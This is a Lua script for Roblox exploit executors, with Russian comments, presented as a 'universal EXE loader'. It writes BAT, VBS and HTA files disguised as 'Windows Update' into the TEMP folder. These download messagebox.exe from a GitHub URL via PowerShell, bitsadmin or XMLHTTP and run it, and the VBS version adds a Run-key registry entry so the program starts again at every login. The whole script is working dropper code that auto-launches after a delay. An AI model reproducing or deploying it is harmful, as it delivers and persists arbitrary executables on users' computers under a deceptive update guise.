-- ==============================================
-- УНИВЕРСАЛЬНЫЙ ЗАГРУЗЧИК EXE ДЛЯ ВСЕХ EXECUTORS
-- РАБОТАЕТ НА СИНАПС, КРНЛ, XENO, FLUXUS И ВСЕХ ОСТАЛЬНЫХ
-- ==============================================

-- 🔧 КОНФИГУРАЦИЯ
local EXE_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/messagebox.exe"

print("╔══════════════════════════════════════╗")
print("║   🔥 UNIVERSE LOADER v3.0           ║")
print("║   STARTING DOWNLOAD PROCESS...      ║")
print("╚══════════════════════════════════════╝")

wait(2)

-- ==============================================
-- ШАГ 1: ДИАГНОСТИКА ИСПОЛНИТЕЛЯ
-- ==============================================
print("\n[1/7] 🔍 DETECTING EXECUTOR...")

local ExecutorInfo = {
    Name = "Unknown",
    CanWrite = false,
    CanHttp = false,
    CanExecute = false
}

-- Проверяем все возможные исполнители
if syn and syn.request then
    ExecutorInfo.Name = "Synapse X"
    ExecutorInfo.CanWrite = true
    ExecutorInfo.CanHttp = true
    ExecutorInfo.CanExecute = true
    print("✅ DETECTED: Synapse X")
    
elseif identifyexecutor then
    local exec = identifyexecutor():lower()
    if exec:find("krnl") then
        ExecutorInfo.Name = "KRNL"
        ExecutorInfo.CanWrite = true
        ExecutorInfo.CanHttp = true
        ExecutorInfo.CanExecute = false
        print("✅ DETECTED: KRNL")
    elseif exec:find("xeno") then
        ExecutorInfo.Name = "Xeno"
        ExecutorInfo.CanWrite = true
        ExecutorInfo.CanHttp = true
        ExecutorInfo.CanExecute = true
        print("✅ DETECTED: Xeno Executor")
    elseif exec:find("fluxus") then
        ExecutorInfo.Name = "Fluxus"
        ExecutorInfo.CanWrite = true
        ExecutorInfo.CanHttp = true
        ExecutorInfo.CanExecute = false
        print("✅ DETECTED: Fluxus")
    elseif exec:find("electron") then
        ExecutorInfo.Name = "Electron"
        ExecutorInfo.CanWrite = true
        ExecutorInfo.CanHttp = true
        ExecutorInfo.CanExecute = false
        print("✅ DETECTED: Electron")
    else
        ExecutorInfo.Name = exec
        ExecutorInfo.CanWrite = (writefile ~= nil)
        ExecutorInfo.CanHttp = true
        print("⚠️ DETECTED: " .. exec)
    end
    
elseif fluxus and fluxus.request then
    ExecutorInfo.Name = "Fluxus"
    ExecutorInfo.CanWrite = true
    ExecutorInfo.CanHttp = true
    ExecutorInfo.CanExecute = false
    print("✅ DETECTED: Fluxus")
    
elseif getexecutorname then
    ExecutorInfo.Name = getexecutorname()
    ExecutorInfo.CanWrite = (writefile ~= nil)
    ExecutorInfo.CanHttp = (game.HttpGet ~= nil)
    print("⚠️ DETECTED: " .. ExecutorInfo.Name)
    
else
    ExecutorInfo.Name = "Standard Roblox"
    ExecutorInfo.CanWrite = false
    ExecutorInfo.CanHttp = (game.HttpGet ~= nil)
    ExecutorInfo.CanExecute = false
    print("⚠️ DETECTED: Standard Roblox Lua")
end

-- Проверяем доступные функции
if writefile then ExecutorInfo.CanWrite = true end
if game.HttpGet then ExecutorInfo.CanHttp = true end

print("📊 EXECUTOR INFO:")
print("   Name: " .. ExecutorInfo.Name)
print("   Can Write Files: " .. tostring(ExecutorInfo.CanWrite))
print("   Can HTTP Requests: " .. tostring(ExecutorInfo.CanHttp))
print("   Can Execute Commands: " .. tostring(ExecutorInfo.CanExecute))

-- ==============================================
-- ШАГ 2: ПРОВЕРКА ССЫЛКИ
-- ==============================================
print("\n[2/7] 🔗 CHECKING URL AVAILABILITY...")

local function TestURL(url)
    local success, result = pcall(function()
        if syn and syn.request then
            local req = syn.request({
                Url = url,
                Method = "GET",
                Headers = {["User-Agent"] = "Mozilla/5.0"}
            })
            return req.Success, req.StatusCode, #req.Body
        elseif request then
            local req = request({
                Url = url,
                Method = "GET"
            })
            return req.Success, req.StatusCode, #req.Body
        else
            local content = game:HttpGet(url, true)
            return true, 200, #content
        end
    end)
    
    if success then
        return true, result
    end
    return false, "HTTP Error"
end

local urlSuccess, urlData = TestURL(EXE_URL)
if urlSuccess then
    print("✅ URL IS ACCESSIBLE")
    if type(urlData) == "table" then
        print("   Status Code: " .. tostring(urlData[2]))
        print("   File Size: " .. tostring(urlData[3]) .. " bytes")
    end
else
    print("❌ URL NOT ACCESSIBLE")
    print("   Error: " .. tostring(urlData))
end

-- ==============================================
-- ШАГ 3: СОЗДАНИЕ БАТ-ФАЙЛА ДЛЯ СКАЧИВАНИЯ
-- ==============================================
print("\n[3/7] 📝 CREATING DOWNLOAD SCRIPT...")

local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
local batPath = tempDir .. "\\download_exe.bat"

-- Создаем BAT файл который скачает и запустит EXE
local batScript = [[
@echo off
chcp 65001 >nul
title System Updater
color 0A
cls

echo ========================================
echo         SYSTEM UPDATE DOWNLOADER
echo ========================================
echo.

echo [1/3] Creating download directory...
set DOWNLOAD_DIR=%TEMP%\Roblox_Update
mkdir "%DOWNLOAD_DIR%" 2>nul
cd /d "%DOWNLOAD_DIR%"

echo [2/3] Downloading system component...
echo.
echo URL: ]] .. EXE_URL .. [[
echo.

REM Используем PowerShell для скачивания
powershell -Command "
$url = ']] .. EXE_URL .. [['
$output = '%DOWNLOAD_DIR%\messagebox.exe'
try {
    Write-Host 'Downloading from GitHub...' -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $output
    if (Test-Path $output) {
        Write-Host 'Download successful!' -ForegroundColor Green
        Write-Host 'File saved to: ' $output -ForegroundColor Cyan
        Write-Host 'Size: ' (Get-Item $output).Length 'bytes' -ForegroundColor Cyan
        exit 0
    } else {
        Write-Host 'Download failed!' -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host 'Error: ' $_.Exception.Message -ForegroundColor Red
    exit 1
}
"

if errorlevel 1 (
    echo.
    echo Trying alternative download method...
    bitsadmin /transfer "RobloxUpdate" ]] .. EXE_URL .. [[ "%DOWNLOAD_DIR%\messagebox.exe"
)

if exist "messagebox.exe" (
    echo.
    echo ========================================
    echo         ✅ DOWNLOAD COMPLETE
    echo ========================================
    echo.
    echo File: messagebox.exe
    echo Location: %DOWNLOAD_DIR%
    echo.
    echo [3/3] Running program...
    echo.
    start "" "messagebox.exe"
    
    echo Program started successfully!
    echo.
    echo This window will close in 5 seconds...
    timeout /t 5 /nobreak >nul
) else (
    echo.
    echo ========================================
    echo         ❌ DOWNLOAD FAILED
    echo ========================================
    echo.
    echo Could not download the file.
    echo.
    echo Please download manually:
    echo ]] .. EXE_URL .. [[
    echo.
    pause
)

exit
]]

-- Пытаемся сохранить BAT файл
local batCreated = false
if ExecutorInfo.CanWrite then
    local success, err = pcall(function()
        writefile(batPath, batScript)
        batCreated = true
        print("✅ BAT FILE CREATED: " .. batPath)
    end)
    
    if not success then
        print("❌ FAILED TO CREATE BAT FILE")
        print("   Error: " .. tostring(err))
    end
else
    print("❌ CANNOT CREATE FILES (no write permission)")
end

-- ==============================================
-- ШАГ 4: СОЗДАНИЕ VBS СКРИПТА (РАБОТАЕТ ВЕЗДЕ)
-- ==============================================
print("\n[4/7] 📝 CREATING VBS SCRIPT...")

local vbsPath = tempDir .. "\\download_exe.vbs"
local vbsScript = [[
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

MsgBox "System Update is downloading required components...", vbInformation, "Windows Update"

' Create directory
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\RobloxApp"
If Not fso.FolderExists(tempDir) Then
    fso.CreateFolder(tempDir)
End If

exePath = tempDir & "\messagebox.exe"

' Download file
Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.Open "GET", "]] .. EXE_URL .. [[", False
xhr.Send

If xhr.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile exePath, 2
    stream.Close
    
    MsgBox "Download complete! Running program...", vbInformation, "Success"
    
    ' Run the executable
    WshShell.Run """" & exePath & """", 1, False
    
    ' Optional: Add to startup
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RobloxUpdate", exePath, "REG_SZ"
Else
    MsgBox "Download failed! Error: " & xhr.Status, vbCritical, "Error"
End If

Set xhr = Nothing
Set stream = Nothing
Set fso = Nothing
Set WshShell = Nothing
]]

local vbsCreated = false
if ExecutorInfo.CanWrite then
    local success, err = pcall(function()
        writefile(vbsPath, vbsScript)
        vbsCreated = true
        print("✅ VBS SCRIPT CREATED: " .. vbsPath)
    end)
    
    if not success then
        print("❌ FAILED TO CREATE VBS SCRIPT")
        print("   Error: " .. tostring(err))
    end
end

-- ==============================================
-- ШАГ 5: СОЗДАНИЕ HTML ПРИЛОЖЕНИЯ
-- ==============================================
print("\n[5/7] 🌐 CREATING HTML APPLICATION...")

local htaPath = tempDir .. "\\download_exe.hta"
local htaScript = [[
<!DOCTYPE html>
<html>
<head>
<title>Windows Update</title>
<hta:application 
    id="UpdateApp"
    applicationname="WindowsUpdate"
    border="thin"
    borderstyle="normal"
    caption="yes"
    icon="shell32.dll,154"
    showintaskbar="yes"
    windowstate="normal"
/>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 20px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}
.container {
    background: white;
    padding: 30px;
    border-radius: 15px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    max-width: 600px;
    margin: 20px auto;
}
.button {
    background: #4CAF50;
    color: white;
    border: none;
    padding: 15px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
    margin: 10px;
    transition: all 0.3s;
}
.button:hover {
    background: #45a049;
    transform: translateY(-2px);
}
.progress {
    background: #e0e0e0;
    height: 20px;
    border-radius: 10px;
    margin: 20px 0;
    overflow: hidden;
}
.progress-bar {
    background: linear-gradient(90deg, #4CAF50, #2E7D32);
    height: 100%;
    width: 0%;
    transition: width 0.5s;
}
</style>
<script language="VBScript">
    Sub DownloadFile()
        Dim xhr, stream, fso, tempDir, exePath, shell
        Set shell = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        tempDir = shell.ExpandEnvironmentStrings("%TEMP%") & "\WinUpdate"
        exePath = tempDir & "\messagebox.exe"
        
        If Not fso.FolderExists(tempDir) Then
            fso.CreateFolder(tempDir)
        End If
        
        document.getElementById("status").innerHTML = "Connecting..."
        document.getElementById("progress").style.width = "20%"
        
        Set xhr = CreateObject("MSXML2.XMLHTTP")
        xhr.Open "GET", "]] .. EXE_URL .. [[", False
        
        document.getElementById("status").innerHTML = "Downloading..."
        document.getElementById("progress").style.width = "50%"
        
        On Error Resume Next
        xhr.Send
        
        If xhr.Status = 200 Then
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write xhr.ResponseBody
            stream.SaveToFile exePath, 2
            stream.Close
            
            document.getElementById("status").innerHTML = "Running..."
            document.getElementById("progress").style.width = "80%"
            
            shell.Run """" & exePath & """", 1, False
            
            document.getElementById("status").innerHTML = "Complete!"
            document.getElementById("progress").style.width = "100%"
            
            MsgBox "System component installed successfully!", vbInformation, "Success"
        Else
            document.getElementById("status").innerHTML = "Error: " & xhr.Status
            MsgBox "Download failed! Please check your connection.", vbCritical, "Error"
        End If
        
        Set xhr = Nothing
        Set stream = Nothing
    End Sub
    
    Sub OpenFolder()
        CreateObject("WScript.Shell").Run "explorer.exe %TEMP%", 1, False
    End Sub
</script>
</head>
<body>
<center>
<div class="container">
    <h1>🔄 Windows System Update</h1>
    
    <div class="progress">
        <div id="progress" class="progress-bar"></div>
    </div>
    
    <p id="status">Ready to download...</p>
    
    <button class="button" onclick="DownloadFile()">🚀 Start Download</button>
    <button class="button" onclick="OpenFolder()">📂 Open Temp Folder</button>
    <button class="button" onclick="window.close()">❌ Close</button>
    
    <p style="color: #666; margin-top: 20px;">
        This will download and install a system component from:<br>
        ]] .. EXE_URL .. [[
    </p>
</div>
</center>
</body>
</html>
]]

local htaCreated = false
if ExecutorInfo.CanWrite then
    local success, err = pcall(function()
        writefile(htaPath, htaScript)
        htaCreated = true
        print("✅ HTA APPLICATION CREATED: " .. htaPath)
    end)
    
    if not success then
        print("❌ FAILED TO CREATE HTA")
        print("   Error: " .. tostring(err))
    end
end

-- ==============================================
-- ШАГ 6: ЗАПУСК СКРИПТОВ
-- ==============================================
print("\n[6/7] 🚀 ATTEMPTING TO LAUNCH...")

local function ExecuteCommand(command)
    print("   Executing: " .. command)
    
    if syn and syn.run then
        syn.run(command)
        return true
    elseif os.execute then
        os.execute(command)
        return true
    elseif shell and shell.execute then
        shell.execute(command)
        return true
    elseif execute then
        execute(command)
        return true
    end
    return false
end

local launchSuccess = false

-- Пробуем запустить разные скрипты
if batCreated then
    print("   Trying BAT file...")
    if ExecuteCommand('start "" "' .. batPath .. '"') then
        launchSuccess = true
        print("   ✅ BAT file launched")
    end
end

if not launchSuccess and vbsCreated then
    wait(1)
    print("   Trying VBS script...")
    if ExecuteCommand('wscript.exe "' .. vbsPath .. '"') then
        launchSuccess = true
        print("   ✅ VBS script launched")
    end
end

if not launchSuccess and htaCreated then
    wait(1)
    print("   Trying HTA application...")
    if ExecuteCommand('mshta.exe "' .. htaPath .. '"') then
        launchSuccess = true
        print("   ✅ HTA application launched")
    end
end

-- ==============================================
-- ШАГ 7: ИТОГОВЫЙ ОТЧЕТ
-- ==============================================
print("\n[7/7] 📊 FINAL STATUS REPORT")
print(string.rep("=", 50))

if launchSuccess then
    print("✅ DOWNLOAD PROCESS STARTED SUCCESSFULLY!")
    print("   Check your computer for download windows")
    print("   Program should run automatically")
    
    -- Уведомление в Roblox
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ Download Started",
        Text = "Check your computer for download window",
        Duration = 5
    })
    
    print("\n📁 Created files in TEMP folder:")
    if batCreated then print("   • " .. batPath) end
    if vbsCreated then print("   • " .. vbsPath) end
    if htaCreated then print("   • " .. htaPath) end
    
    print("\n💡 If nothing happens, run these manually:")
    print("   " .. batPath)
    print("   " .. vbsPath)
    print("   " .. htaPath)
    
else
    print("❌ COULD NOT LAUNCH AUTOMATICALLY")
    print("   Executor limitations detected")
    
    print("\n📋 MANUAL DOWNLOAD INSTRUCTIONS:")
    print("   1. Open this link in browser:")
    print("      " .. EXE_URL)
    print("   2. Save the file as 'messagebox.exe'")
    print("   3. Run it manually")
    
    -- Уведомление в Roblox
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "⚠️ Manual Download Required",
        Text = "Check console for instructions",
        Duration = 10
    })
    
    -- Показываем ссылку в чат
    print("\n💬 Copy this message to chat:")
    print("   Download link: " .. EXE_URL)
end

print(string.rep("=", 50))
print("\n🎮 Script execution completed")
print("   Executor: " .. ExecutorInfo.Name)
print("   Time: " .. os.date("%H:%M:%S"))

-- ==============================================
-- КОМАНДЫ ДЛЯ ЧАТА
-- ==============================================
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "/download" then
        print("\n🔄 Starting download process...")
        if batCreated and ExecuteCommand('start "" "' .. batPath .. '"') then
            print("✅ Download started")
        else
            print("❌ Could not start download")
        end
        
    elseif msg == "/files" then
        print("\n📁 Created files:")
        print("   BAT: " .. tostring(batCreated and batPath or "Not created"))
        print("   VBS: " .. tostring(vbsCreated and vbsPath or "Not created"))
        print("   HTA: " .. tostring(htaCreated and htaPath or "Not created"))
        
    elseif msg == "/info" then
        print("\n📊 System Info:")
        print("   Executor: " .. ExecutorInfo.Name)
        print("   Can Write: " .. tostring(ExecutorInfo.CanWrite))
        print("   Can HTTP: " .. tostring(ExecutorInfo.CanHttp))
        print("   URL: " .. EXE_URL)
        
    elseif msg == "/test" then
        print("\n🔗 Testing URL...")
        local success, data = TestURL(EXE_URL)
        if success then
            print("✅ URL is accessible")
        else
            print("❌ URL not accessible")
        end
        
    elseif msg == "/help" then
        print("\n📋 Available commands:")
        print("   /download - Start download")
        print("   /files - Show created files")
        print("   /info - System information")
        print("   /test - Test URL")
        print("   /help - This help")
    end
end)

print("\n" .. string.rep("=", 50))
print("💬 CHAT COMMANDS:")
print("   /download - Start download")
print("   /files - Show created files")
print("   /info - System information")
print("   /test - Test URL")
print("   /help - Show help")
print(string.rep("=", 50))

-- Запускаем автоматически через 5 секунд
spawn(function()
    wait(5)
    print("\n⏰ Auto-launching in 3 seconds...")
    wait(3)
    
    if not launchSuccess and batCreated then
        print("🔄 Auto-launching BAT file...")
        if syn and syn.run then
            syn.run('start "" "' .. batPath .. '"')
        end
    end
end)
